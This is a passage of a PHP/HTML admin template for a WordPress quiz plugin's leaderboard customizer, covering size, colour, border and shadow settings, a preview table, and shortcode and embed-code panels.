									<div class="slider-user-value">
										<input type="text" name="lb_select_background_height" value="<?php echo $lb_template_height; ?>">
										<select class="lb-select-background-height-option" name="lb-select-background-height-option">
											<option value="px" <?php if($lb_select_background_height_option == 'px'){ echo 'selected="selected"'; } ?>>px</option>
											<option value="vh" <?php if($lb_select_background_height_option == 'vh'){ echo 'selected="selected"'; } ?>>vh</option></select>
										</select>
									</div>
								</div>
							</div>
						</div>

						<div class="Template-Customize-element Template-Customize-element-per-row-one">
							<div class="Template-Customize-element-inner template_img_style">
								<div class="inner_template_style_box"> 
									<h4>Inside Section Width</h4>	
									<p class="lb_temp_internal_width_outer" style="<?php if($lb_select_background_internal_width_option == 'px'){ echo 'display:block'; }else{ echo 'display:none'; } ?>">
										<input id="lb_temp_internal_width" name="lb_temp_internal_width" data-slider-id="ex1Slider" type="text" data-slider-min="500" data-slider-max="2000" data-slider-step="1" data-slider-value="<?php echo $lb_temp_internal_width; ?>">
									</p>
									<p class="lb_temp_internal_width_percentage_outer" style="<?php if($lb_select_background_internal_width_option == '%'){ echo 'display:block'; }else{ echo 'display:none'; } ?>">
										<input id="lb_temp_internal_width_percentage" name="lb_temp_internal_width_percentage" data-slider-id="ex1Slider" type="text" data-slider-min="50" data-slider-max="100" data-slider-step="1" data-slider-value="<?php echo $lb_temp_internal_width; ?>">
									</p>
									<div class="slider-user-value">
										<input type="text" name="lb_select_internal_background_width" value="<?php echo $lb_temp_internal_width; ?>">
										<select class="lb-select-background-internal-width-option" name="lb-select-background-internal-width-option">
											<option value="px" <?php if($lb_select_background_internal_width_option == 'px'){ echo 'selected="selected"'; } ?>>px</option>
											<option value="%" <?php if($lb_select_background_internal_width_option == '%'){ echo 'selected="selected"'; } ?>>%</option></select>
									</div>
								</div>
							</div>
						</div>	

						<div class="Template-Customize-element Template-Customize-element-per-row-one">	
							<div class="Template-Customize-element-inner start_temp_width">
								<div class="inner_template_style_box">
									<h4>Template Alignment</h4>
									<p>
										<select id="lb_temp_aligment" name="lb_temp_aligment">
											<option value="none" <?php if($lb_temp_aligment == "none"){ echo "selected"; } ?>>Center</option>
											<option value="left" <?php if($lb_temp_aligment == "left"){ echo "selected"; } ?>>Left</option>
											<option value="right" <?php if($lb_temp_aligment == "right"){ echo "selected"; } ?>>Right</option>
										</select>
									</p>
								</div>
							  </div>
						</div>	

						<h2>Pagination </h2>
						<div class="Template-Customize-element Template-Customize-element-per-row-one">	
							<div class="Template-Customize-element-inner start_temp_width">
								<div class="inner_template_style_box">
									<h4>Pagination (entries)</h4>
									<input type="number" id ="lb_pagination" name="lb_pagination" value="<?php echo $lb_pagination; ?>">
								</div>
							  </div>
						</div>	

					</div>
				</div>
		   </div>		 
		 	<div class="Template-Customize-Setting ">
				<div class="showHideLeftSidebaroptions">
					<h3 class="Template-Customize_heading"> 
						<div class="toll-tip-title-v2" style="">Background / Colors</div> 
						<i class="fa fa-paint-brush" title="Content Area" style="font-size: 23px;"></i>
						<div class="customize_open_close">   
							<i class="fa fa-angle-up customize_close" aria-hidden="true" style="display:none"></i>
							<i class="fa fa-angle-down customize_open" aria-hidden="true"></i>
						</div>
					</h3> 
				</div>
	            <div class="customizer_innner_sections template-customizer-v2 leaderboard-customizer-section" style="display:none">
	        		<div class="sqb_closed_ufp_customizer_opiton"><i class="fa fa-times"></i></div>
					<div class="customizer_innner_sections-inner">
						<h2>Colors</h2>
						
						<div class="Template-Customize-element Template-Customize-element-per-row-one">
							<div class="Template-Customize-element-inner template_img_style">
								<div class="inner_template_style_box image_opacity_btn" style="">
									<a href="javascript:void(0)" class="sqb_change_lb_bg_image mr-4">Change Image</a>
									<a href="javascript:void(0)" class="sqb_remove_lb_bg_image">Remove Image</a>
								</div>
							</div>	
						</div>

						<div class="Template-Customize-element Template-Customize-element-per-row-two">
							<div class="Template-Customize-element-inner template_img_style" >
								<div class="inner_template_style_box"> <h4>Background Color</h4>	
									<div id="lb_temp_background_color_div" class="input-group colorpicker-component colorpicker-element">
										<input type="text" name="lb_temp_background_color" value="<?php echo $lb_temp_background_color; ?>" id="lb_temp_background_color" class="colorpicker-element"> 
										<span class="input-group-addon">
											<i style="background-color: <?php echo $lb_temp_background_color; ?>;"></i>
										</span>
									</div>	
								</div>
							</div>
						</div>

						<div class="Template-Customize-element Template-Customize-element-per-row-two">
							<div class="Template-Customize-element-inner template_img_style" >
								<div class="inner_template_style_box"> <h4>Background Opcaity</h4>	
									<input id="lb_temp_background_opacity" class="slider" data-slider-id='ex1Slider' type="text" data-slider-min="0" data-slider-max="1" data-slider-step="0.1" data-slider-value="<?php echo $lb_temp_background_opacity; ?>" />
								</div>
							</div>
						</div>


						<h2>Border Customizer</h2>

						<div class="Template-Customize-element Template-Customize-element-per-row-two">
							<div class="Template-Customize-element-inner start_temp_width">
								<div class="inner_template_style_box">
									<h4>Border Width</h4>
									<p>
										<input id="lb_temp_border_width" class="slider" data-slider-id='ex1Slider' type="text" data-slider-min="0" data-slider-max="20" data-slider-step="1" data-slider-value="<?php echo $lb_temp_border_width; ?>" />			
									</p>
								</div>
							</div>
						</div>
					
						<div class="Template-Customize-element Template-Customize-element-per-row-two">
							<div class="Template-Customize-element-inner start_temp_width">
								<div class="inner_template_style_box">
									<h4>Border Style</h4>
									<p>
										<select id="lb_temp_border_style" name="lb_temp_border_style">
											<option value="none" <?php if($lb_temp_border_style == "none"){ echo "selected"; } ?>>None</option>
											<option value="solid <?php if($lb_temp_border_style == "solid"){ echo "selected"; } ?>">Solid</option>
											<option value="dashed" <?php if($lb_temp_border_style == "dashed"){ echo "selected"; } ?>>Dashed</option>
											<option value="dotted" <?php if($lb_temp_border_style == "dotted"){ echo "selected"; } ?>>Dotted</option>											
										</select>
									</p>
								</div>
						  	</div>
						</div>
					
						<div class="Template-Customize-element Template-Customize-element-per-row-two">
							<div class="Template-Customize-element-inner template_img_style">
								<div class="inner_template_style_box"> <h4>Border Color</h4>	
									<div id="lb_temp_border_color_div" class="input-group colorpicker-component colorpicker-element">
										<input type="text" name="lb_temp_border_color" value="<?php echo $lb_temp_border_color; ?>" id="lb_temp_border_color" class="colorpicker-element"> 
										<span class="input-group-addon">
											<i style="background-color: <?php echo $lb_temp_border_color; ?>;"></i>
										</span>
									</div>
								</div>
							</div>
						</div>

						<div class="Template-Customize-element Template-Customize-element-per-row-two">
							<div class="Template-Customize-element-inner start_temp_width">
								<div class="inner_template_style_box">
									<h4>Border Radius</h4>
									<p>
										<input id="lb_temp_border_radius" name="lb_temp_border_radius" data-slider-id="ex1Slider" type="text" data-slider-min="0" data-slider-max="20" data-slider-step="1" data-slider-value="<?php echo $lb_temp_border_radius; ?>"> 
									</p>
								</div>
							</div>
						</div>



					</div>
				</div>
		   </div>

		   <div class="Template-Customize-Setting ">
				<div class="showHideLeftSidebaroptions">
					<h3 class="Template-Customize_heading"> 
						<div class="toll-tip-title-v2" style="">Border / Shadow</div> 
						<i class="fa fa-table" title="Tabs" style="font-size: 25px;"></i>
						<div class="customize_open_close">   
							<i class="fa fa-angle-up customize_close" aria-hidden="true" style="display:none"></i>
							<i class="fa fa-angle-down customize_open" aria-hidden="true"></i>
						</div>
					</h3> 
				</div>
	            <div class="customizer_innner_sections template-customizer-v2 leaderboard-customizer-section" style="display:none">
	        		<div class="sqb_closed_ufp_customizer_opiton"><i class="fa fa-times"></i></div>
					<div class="customizer_innner_sections-inner">
						<h2>External Shadow Customizer</h2>
						<div class="Template-Customize-element Template-Customize-element-per-row-two">
							<div class="Template-Customize-element-inner template_img_style">
								<div class="inner_template_style_box"> <h4>Shadow Color</h4>	
									<div id="lb_temp_shadow_color_div" class="input-group colorpicker-component colorpicker-element">
										<input type="text" value="<?php echo $lb_temp_shadow_color; ?>" id="lb_temp_shadow_color" name="lb_temp_shadow_color" class="colorpicker-element"> 
										<span class="input-group-addon">
											<i style="background-color: <?php echo $lb_temp_shadow_color; ?>;"></i>
										</span>
									</div>
								</div>
							</div>
						</div>	

						<div class="Template-Customize-element Template-Customize-element-per-row-two">
							<div class="Template-Customize-element-inner">
								<div class="inner_template_style_box">
									<h4>Spread Radius</h4>
									<p>
										<input id="lb_temp_spread_radius" name="lb_temp_spread_radius" data-slider-id="ex1Slider" type="text" data-slider-min="0" data-slider-max="20" data-slider-step="1" data-slider-value="<?php echo $lb_temp_spread_radius; ?>"> 
									</p>
								</div>
							</div>
						</div>

						<div class="Template-Customize-element Template-Customize-element-per-row-two">
							<div class="Template-Customize-element-inner">
								<div class="inner_template_style_box">
									<h4>Blur Radius</h4>
									<p>
										<input id="lb_temp_blur_radius" name="lb_temp_blur_radius" data-slider-id="ex1Slider" type="text" data-slider-min="0" data-slider-max="20" data-slider-step="1" data-slider-value="<?php echo $lb_temp_blur_radius; ?>"> 
									</p>
								</div>
							</div>
						</div>

						<div class="Template-Customize-element Template-Customize-element-per-row-two">
							<div class="Template-Customize-element-inner">
								<div class="inner_template_style_box">
									<h4>Horizontal Length</h4>
									<p>
										<input id="lb_temp_horizontal_length" name="lb_temp_horizontal_length" data-slider-id="ex1Slider" type="text" data-slider-min="0" data-slider-max="20" data-slider-step="1" data-slider-value="<?php echo $lb_temp_horizontal_length; ?>"> 
									</p>
								</div>
							</div>
						</div>

						<div class="Template-Customize-element Template-Customize-element-per-row-two">
							<div class="Template-Customize-element-inner">
								<div class="inner_template_style_box">
									<h4>Vertical Length</h4>
									<p>
										<input id="lb_temp_vertical_length" name="lb_temp_vertical_length" data-slider-id="ex1Slider" type="text" data-slider-min="0" data-slider-max="20" data-slider-step="1" data-slider-value="<?php echo $lb_temp_vertical_length; ?>"> 
									</p>
								</div>
							</div>
						</div>
						
					</div>
				</div>
		   </div>

		   <div class="Template-Customize-Setting ">
				<div class="showHideLeftSidebaroptions">
					<h3 class="Template-Customize_heading"> 
						<div class="toll-tip-title-v2" style="">Inner Customizer</div> 
						<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M436 192H312c-13.3 0-24-10.7-24-24V44c0-6.6 5.4-12 12-12h40c6.6 0 12 5.4 12 12v84h84c6.6 0 12 5.4 12 12v40c0 6.6-5.4 12-12 12zm-276-24V44c0-6.6-5.4-12-12-12h-40c-6.6 0-12 5.4-12 12v84H12c-6.6 0-12 5.4-12 12v40c0 6.6 5.4 12 12 12h124c13.3 0 24-10.7 24-24zm0 300V344c0-13.3-10.7-24-24-24H12c-6.6 0-12 5.4-12 12v40c0 6.6 5.4 12 12 12h84v84c0 6.6 5.4 12 12 12h40c6.6 0 12-5.4 12-12zm192 0v-84h84c6.6 0 12-5.4 12-12v-40c0-6.6-5.4-12-12-12H312c-13.3 0-24 10.7-24 24v124c0 6.6 5.4 12 12 12h40c6.6 0 12-5.4 12-12z"></path></svg>
						<div class="customize_open_close">   
							<i class="fa fa-angle-up customize_close" aria-hidden="true" style="display:none"></i>
							<i class="fa fa-angle-down customize_open" aria-hidden="true"></i>
						</div>
					</h3> 
				</div>
	            <div class="customizer_innner_sections template-customizer-v2 leaderboard-customizer-section" style="display:none">
	        		<div class="sqb_closed_ufp_customizer_opiton"><i class="fa fa-times"></i></div>
					<div class="customizer_innner_sections-inner">
						<h2>Inner Customizer</h2>
						<div class="Template-Customize-element Template-Customize-element-per-row-two">
							<div class="Template-Customize-element-inner template_img_style" >
								<div class="inner_template_style_box"> <h4>Leaderboard Background Color</h4>	
									<div id="lb_leaderboard_background_color_div" class="input-group colorpicker-component colorpicker-element">
										<input type="text" name="lb_leaderboard_background_color" value="<?php echo $lb_leaderboard_background_color; ?>" id="lb_leaderboard_background_color" class="colorpicker-element"> 
										<span class="input-group-addon">
											<i style="background-color: <?php echo $lb_leaderboard_background_color; ?>;"></i>
										</span>
									</div>	
								</div>
							</div>
						</div>
						<div class="Template-Customize-element Template-Customize-element-per-row-two">
							<div class="Template-Customize-element-inner template_img_style" >
								<div class="inner_template_style_box"> <h4>Description Background Color</h4>	
									<div id="lb_description_background_color_div" class="input-group colorpicker-component colorpicker-element">
										<input type="text" name="lb_description_background_color" value="<?php echo $lb_description_background_color; ?>" id="lb_description_background_color" class="colorpicker-element"> 
										<span class="input-group-addon">
											<i style="background-color: <?php echo $lb_description_background_color; ?>;"></i>
										</span>
									</div>	
								</div>
							</div>
						</div>
						
						<div class="Template-Customize-element Template-Customize-element-per-row-two">
							<div class="Template-Customize-element-inner template_img_style" >
								<div class="inner_template_style_box"> <h4>Heading Background Color</h4>	
									<div id="lb_heading_background_color_div" class="input-group colorpicker-component colorpicker-element">
										<input type="text" name="lb_heading_background_color" value="<?php echo $lb_heading_background_color; ?>" id="lb_heading_background_color" class="colorpicker-element"> 
										<span class="input-group-addon">
											<i style="background-color: <?php echo $lb_heading_background_color; ?>;"></i>
										</span>
									</div>	
								</div>
							</div>
						</div>
						<div class="Template-Customize-element Template-Customize-element-per-row-two">
							<div class="Template-Customize-element-inner template_img_style" >
								<div class="inner_template_style_box"> <h4>Alternate Background Color</h4>	
									<div id="lb_alternate_background_color_div" class="input-group colorpicker-component colorpicker-element">
										<input type="text" name="lb_alternate_background_color" value="<?php echo $lb_alternate_background_color; ?>" id="lb_alternate_background_color" class="colorpicker-element"> 
										<span class="input-group-addon">
											<i style="background-color: <?php echo $lb_alternate_background_color; ?>;"></i>
										</span>
									</div>	
								</div>
							</div>
						</div>

						<div class="Template-Customize-element Template-Customize-element-per-row-two">
							<div class="Template-Customize-element-inner template_img_style" >
								<div class="inner_template_style_box"> <h4>Alternate Background Color second</h4>	
									<div id="lb_alternate_second_background_color_div" class="input-group colorpicker-component colorpicker-element">
										<input type="text" name="lb_alternate_second_background_color" value="<?php echo $lb_alternate_second_background_color; ?>" id="lb_alternate_second_background_color" class="colorpicker-element"> 
										<span class="input-group-addon">
											<i style="background-color: <?php echo $lb_alternate_second_background_color; ?>;"></i>
										</span>
									</div>	
								</div>
							</div>
						</div>

						<div class="Template-Customize-element Template-Customize-element-per-row-two">
							<div class="Template-Customize-element-inner template_img_style" >
								<div class="inner_template_style_box"> <h4>Opt-out Background Color</h4>	
									<div id="lb_optout_background_color_div" class="input-group colorpicker-component colorpicker-element">
										<input type="text" name="lb_optout_background_color" value="<?php echo $lb_optout_background_color; ?>" id="lb_optout_background_color" class="colorpicker-element"> 
										<span class="input-group-addon">
											<i style="background-color: <?php echo $lb_optout_background_color; ?>;"></i>
										</span>
									</div>	
								</div>
							</div>
						</div>


					</div>
				</div>
		   </div>

	  	</div>
	</div>

	<div class="sqb_leaderboard_engagement-inner sqb_leaderboard_engagement_full_width_temp <?php echo $lb_temp_aligment_class; ?>">
		<div class="sqb_leaderboard_engagement-left sqb_leaderboard_drap_drop_parent_class">
			<div class="leaderboard-main">
				<div class="leaderboard-bg">
					<img style="<?php echo $lb_leaderboardimage_show; ?>" class="lb_leaderboardimage" src="<?php echo $lb_leaderboardimage; ?>">
				</div>
				<div class="leaderboard-content-main">
					<div class="leaderboard-header sqb_tiny_mce_editor">
						<?php echo $leaderboard_title; ?>
					</div>
					<div class="leader-content sqb_tiny_mce_editor">
								<?php echo $leaderboard_content; ?>
						</div>
					<div class="leaderboard-table">
						<?php echo $customizer_html; ?>
					</div>
					<?php 
					$dont_want_listed = sqbGetValidSettingsByKey('dont_want_listed');
					if(isset($dont_want_listed) && $dont_want_listed != ''){
						
					}else{
						$dont_want_listed = "Don't want to be listed?";
					}

					$click_to_optout = sqbGetValidSettingsByKey('click_to_optout');
					if(isset($click_to_optout) && $click_to_optout != ''){
						
					}else{
						$click_to_optout = 'Click to Opt-out';
					}
					?>

					<div class="optiout-wrapper" bis_skin_checked="1">
                        <div class="optout-wrapper" data-usertype="WP">
		                    <h3><div><?php echo stripslashes($dont_want_listed); ?></div></h3>
		                    <?php echo stripslashes($click_to_optout); ?>
	                    </div>
                    </div>	
				</div>
			</div>
			<div class="dummy-message">This is just an example table. You can customize the background, colors, text, font, etc. in the customizer above.</div>
		</div>
		
	</div>
	<div class="quiz-actions student-save-data">
		<a href="javascript:void(0)" class="quiz--btn quiz-back-btn sqb_leaderboard_back_btn"> Back </a>
		<a href="javascript:void(0)" class="quiz--btn quiz-save-btn" onclick="sqb_save_leaderboard_data()"> Save </a>
		<a href="javascript:void(0)" class="quiz--btn quiz-save-next-btn" onclick="sqb_save_leaderboard_data('next')"> Save & Next </a>
	</div>
</div>
<div class="tab-pane fade" id="settings_shortcode_tab" role="tabpanel" aria-labelledby="settings_shortcode_tab">
	<div class="leaderboard_shortcode_details">
		<span><strong>If it's a WordPress site, use shortcode.</strong></span>
		<p><span><b>Name:</b> <span class="sqb_detail_quiz_name"><?php echo $leaderboard_name; ?></span></span></p>
		<div class="mb-0 leaderboard-shortcode-wrapper"><span><b>Shortcode:</b> <span class="sqb_detail_quiz_type"><div class="shortcode_table_td" bis_skin_checked="1"> <span id="eng_dynamic_copyable_text_1" class="leaderboard_shortcode_id">[SQBLeaderboard id=<?php echo $id; ?>][/SQBLeaderboard]</span><span data-id="eng_dynamic_copyable_text_1" id="copy_shortcode" class="copy-btn theme-button btn btn-info " onclick="sqb_leaderboard_copy_to_clipboard(this)">Copy</span></div></span></span></div>
	</div>

	<div class="shortocde_details embed-code-hide"> 
		<p class="embedCodeOuterMain"><span><strong>If it's not a WP site, use the embed code.</strong></span><br>
		<a class="ManageQuiz-action-btn item-embed-btn leaderboard-embed-btn" title="Embed Code" href="javascript:void(0)"><i class="fa fa-code"></i> Click Here for Embed Code</a>	 </p>
	</div>


	<div class="quiz-actions student-save-data">
		<a href="javascript:void(0)" class="quiz--btn quiz-back-btn sqb_leaderboard_back_btn"> Back </a>
		<a href="<?php echo admin_url('admin.php?page=sqb_leaderboard_page'); ?>" class="quiz--btn quiz-save-btn return-leaderboard-home"> Return to Leaderboard Dashboard </a>
	</div>
</div>


 <div class="modal fade quiz-popup-style" id="embedCodeLeaderboardModal" tabindex="-1" role="dialog" aria-labelledby="embedCodeLeaderboardModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-dialog-centered" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="embedCodeLeaderboardModalLabel">Embed Code</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
        <div class="embed-code-outer">
			<div class="info-div1">
				<p>Want to publish this leaderboard on a different site? Just copy and paste the code below on any site and this leaderboard will be displayed on that site even if you don't have SQB on that site.</p>
			</div>
        	<span class="shortcode_display" id="copyLeaderboardEmbedCodeOuter"></span>
        	<span data-id="copyLeaderboardEmbedCodeOuter" class="embed-code-copy" onclick="sqb_external_leaderboard_copy_to_clipboard(this)"><i class="fa fa-files-o" aria-hidden="true"></i> Copy</span>
        </div>
        
      </div>
    </div>
  </div>
</div>